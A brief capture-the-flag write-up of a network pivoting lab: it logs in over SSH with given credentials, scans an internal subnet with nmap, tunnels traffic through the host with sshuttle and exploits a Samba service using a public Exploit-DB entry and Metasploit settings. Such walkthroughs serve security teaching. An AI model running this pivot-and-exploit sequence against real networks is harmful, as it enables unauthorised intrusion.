# 1 sep 2021 | pivoting 


## given ssh credintials :

connect :`ssh cybertalents@3.127.39.160 -p 20022 `

## discovery :

![image](https://user-images.githubusercontent.com/67979878/131594833-43362f67-0d53-47cd-a3db-f78e9a7b8c55.png)

so this machine is at 2 networks let's enumerate machines around in network eth1 :

i know it has mask 255.255.0.0 which means /16 to scan all devices but let's start small to save time and see 

start with /24 :`cybertalents@0856e73bdeff:~$ nmap -sV -v 172.19.0.0/24 ` 


````bash
Nmap scan report for ip-172-19-0-1.eu-central-1.compute.internal (172.19.0.1)
Host is up (0.00023s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
6699/tcp open  tcpwrapped
Service Info: Host: 537BFF5E5834; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 0856e73bdeff (172.19.0.2)
Host is up (0.00025s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````

searching for some exploits :

https://www.exploit-db.com/exploits/42084


but wait ? how can we exploit a machine we can't access from our kali ?

![Alt Text](https://media.giphy.com/media/a5viI92PAF89q/giphy.gif)


that is why we need "routing" ! 

hence we have ssh creds we kan use **sshuttle**

basic command be like :`$ sudo sshuttle -r username@sshserver 0.0.0.0/0 -vv`

it will act as a vpn which make our ip = ssh-ed machine ip :) 

`$ sudo sshuttle -r cybertalents@3.127.39.160:20022 -x 3.127.39.160 0.0.0.0/0 -v   
`

![image](https://user-images.githubusercontent.com/67979878/131596008-7f3e6fc0-fd03-4f23-8ed2-80a551f82214.png)

now it acts as if we are inside the network and can see all ! 

now we can work :) 

exploit for ip : 172.19.0.1
https://www.exploit-db.com/exploits/42084

## exploit :

![image](https://user-images.githubusercontent.com/67979878/131596205-5d448a50-fe1f-4546-a67a-f932c8eef728.png)

solution :
```
set SMB::AlwaysEncrypt false
set SMB::ProtocolVersion 1

```

![image](https://user-images.githubusercontent.com/67979878/131596349-970731fe-dbd8-4244-9d60-5f41616b1efc.png)

![image](https://user-images.githubusercontent.com/67979878/131596614-243f188a-00f0-47ae-a815-f293ef56db21.png)

![image](https://user-images.githubusercontent.com/67979878/131596627-e0e3b2db-4829-4652-ad4c-588b71e2d914.png)


# pwned
